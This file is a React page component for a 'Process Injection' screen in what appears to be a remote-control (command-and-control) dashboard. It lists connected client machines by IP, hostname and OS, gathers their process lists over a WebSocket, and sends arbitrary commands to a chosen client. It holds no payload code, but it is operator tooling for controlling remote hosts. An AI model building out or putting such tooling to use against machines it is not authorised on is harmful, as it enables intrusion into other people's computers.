import { useEffect, useMemo, useState } from 'react'
import ClientList, { type ClientItem } from '../../UI/ClientList'
import { ConfirmModal } from '../../UI'
import ProcessInjectionPanel from '../../UI/ProcessInjectionPanel'
import { useBridgeWebSocket } from '../../hooks/BridgeWebSocketProvider'
import { useConfirmAction } from '../../hooks/useConfirmAction'
import { useDashboardStore } from '../../store/dashboardStore.ts'

function isRecord(value: unknown): value is Record<string, unknown> {
  return typeof value === 'object' && value !== null
}

function mapCachedClientToItem(value: unknown): ClientItem | null {
  if (!isRecord(value)) return null

  const id = String(value.id ?? '').trim()
  if (!id) return null

  return {
    id,
    ip: String(value.ip ?? value.ip_address ?? '-'),
    hostname: String(value.hostname ?? value.host ?? '-'),
    os: String(value.os ?? value.os_version ?? value.platform ?? '-'),
    status: String(value.status ?? (value.is_online ? 'online' : 'offline')),
    lastSeen: typeof value.lastSeen === 'number' ? value.lastSeen : typeof value.last_seen === 'number' ? value.last_seen : Date.now(),
  }
}

export default function ProcessInjectionPage() {
  const [selectedClientId, setSelectedClientId] = useState<string | undefined>(undefined)

  const { status, lastError, subscribeAll, send } = useBridgeWebSocket()
  const dashboardStore = useDashboardStore()

  const clients = useMemo(() => {
    return dashboardStore.clients.map(mapCachedClientToItem).filter((client): client is ClientItem => client !== null)
  }, [dashboardStore.clients])

  const selectedClient = useMemo(() => {
    return clients.find((client) => client.id === selectedClientId)
  }, [clients, selectedClientId])

  useEffect(() => {
    const unsubscribe = subscribeAll((message, topic) => {
      const resolvedTopic = topic ?? message.topic ?? message.type

      if (resolvedTopic === 'process_list') {
        const processClientId = typeof message.clientId === 'string' ? message.clientId : selectedClientId
        const rawProcesses = (Array.isArray(message.processes)
          ? message.processes
          : Array.isArray(message.payload)
            ? message.payload
            : Array.isArray(message.data)
              ? message.data
              : []) as any[]
        const parsed = Array.isArray(rawProcesses) ? rawProcesses.map((p: any) => ({
          pid: p.pid as number,
          name: p.name as string || '',
          memory: p.memory as number || 0,
          architecture: p.architecture as string || 'Unknown',
          username: p.username as string || 'Unknown',
          path: p.path as string || '',
          priority: p.priority as number || 0
        })) : []
        
        if (processClientId && parsed.length > 0) {
          dashboardStore.setProcessList(processClientId, parsed)
        }
        return
      }
    })

    return unsubscribe
  }, [subscribeAll, selectedClientId, dashboardStore])

  useEffect(() => {
    setSelectedClientId((current) => {
      if (clients.length === 0) return undefined
      if (current && clients.some((client) => client.id === current)) return current
      return clients[0].id
    })
  }, [clients])

  const handleSendCommand = (command: string) => {
    if (!selectedClientId || !send) return;
    
    // Send command through WebSocket
    const message = {
      type: 'command',
      clientId: selectedClientId,
      command: command
    };
    
    // Use the WebSocket send function
    const success = send(message);
    
    if (!success) {
      console.error('Failed to send command via WebSocket');
    } else {
      console.log('Command sent:', command, 'to client:', selectedClientId);
    }
  };

  const deleteClientRequest = (client: ClientItem) => {
    dashboardStore.removeClient(client.id)
    send({
      type: 'db_query',
      query: 'delete_client',
      clientId: client.id,
      impersonateUserId: dashboardStore.impersonateUserId ?? undefined,
    })
  }

  const {
    pendingItem: pendingDeleteClient,
    isOpen: isDeleteModalOpen,
    requestConfirm: requestDeleteConfirm,
    cancelConfirm: cancelDeleteConfirm,
    confirm: confirmDeleteClient,
  } = useConfirmAction<ClientItem>(deleteClientRequest)

  return (
    <div className="space-y-4 overflow-x-hidden bg-slate-950!">
      <div className="panel flex flex-wrap items-center justify-between gap-3 p-2 w-full">
        <div>
          <h3 className="text-lg font-semibold text-slate-100">Process Injection</h3>
          {selectedClient ? (
            <p className="text-sm text-slate-300">
              Selected: <span className="font-medium text-slate-100">{selectedClient.id}</span> · {selectedClient.hostname} ·{' '}
              {selectedClient.ip} · {selectedClient.os}
            </p>
          ) : (
            <p className="text-sm text-slate-400">No client selected</p>
          )}
        </div>

        <div className="text-right text-sm">
          <p className="text-slate-300">Socket: <span className="font-medium capitalize text-slate-100">{status}</span></p>
          {lastError ? <p className="text-red-400">{lastError}</p> : null}
        </div>
      </div>

      <div className="grid min-w-0 gap-4">
        <ClientList
          clients={clients}
          onSelectClient={(client) => setSelectedClientId(client.id)}
          selectedClientId={selectedClientId}
          onDeleteClient={requestDeleteConfirm}
        />
        <div className="sticky top-4 lg:top-8 h-[calc(100vh-8rem)] min-h-160 min-w-0 overflow-hidden">
          <ProcessInjectionPanel 
            clientId={selectedClientId} 
            className="h-full min-h-0" 
            onSendCommand={handleSendCommand}
          />
        </div>
      </div>

      <ConfirmModal
        open={isDeleteModalOpen}
        title="Delete Client"
        message={pendingDeleteClient ? `Delete client ${pendingDeleteClient.id}? This removes stored data and disconnects it if online.` : ''}
        confirmLabel="Delete"
        cancelLabel="Cancel"
        variant="danger"
        onConfirm={confirmDeleteClient}
        onCancel={cancelDeleteConfirm}
      />
    </div>
  )
}
